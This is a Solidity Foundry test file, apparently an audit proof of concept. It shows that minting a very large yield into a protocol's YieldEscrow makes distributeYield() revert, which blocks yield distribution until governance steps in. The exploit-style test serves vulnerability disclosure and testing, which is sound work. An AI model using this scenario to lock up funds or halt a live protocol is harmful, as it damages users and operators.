pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";

// ATTACK TIMELINE:
// 1. [Setup] Protocol is deployed via ToL1WeiHarness. User deposits and stakes to ensure sUSDM has stakers.
// 2. [T=1] A massive yield amount (e.g., 10 billion USDC) accumulates in YieldEscrow, simulating a large L1 bridge or long period without distribution.
// 3. [T=2] Operator calls distributeYield().
// 4. [T=3] Vault computes userShare = (totalYield * userYieldBps) / 10000, which exceeds config.maxYieldPerInjection().
// 5. [T=4] Vault calls susdm.injectYield(userShare), which reverts with 'sUSDM: yield exceeds max'.
// 6. [Assert] The entire distributeYield transaction reverts, permanently DoSing yield distribution until governor intervenes.

contract AuditAgentPoC is ToL1WeiHarness {
    function setUp() public override {
        super.setUp();
    }

    function test_exploit() public {
        // 1. Setup: Deposit and stake to ensure sUSDM has stakers (L1-H1 guard)
        _depositAs(user1, 100_000e6);
        _stakeAs(user1, 1_000e6);

        // 2. Accumulate massive yield in YieldEscrow to exceed maxYieldPerInjection
        // Minting 10 billion USDC to simulate a large L1 yield bridge or extended period without distribution
        uint256 massiveYield = 10_000_000_000e6;
        usdc.mint(address(yieldEscrow), massiveYield);

        // 3. Operator calls distributeYield()
        // 4. Assert it reverts because userShare > maxYieldPerInjection
        vm.prank(admin);
        vm.expectRevert("sUSDM: yield exceeds max");
        vault.distributeYield();

        // 5. Verify that yield distribution is stuck (DoS)
        // The yieldEscrow balance remains unchanged because the transaction reverted
        assertEq(usdc.balanceOf(address(yieldEscrow)), massiveYield, "YieldEscrow balance should remain unchanged due to DoS");
    }
}
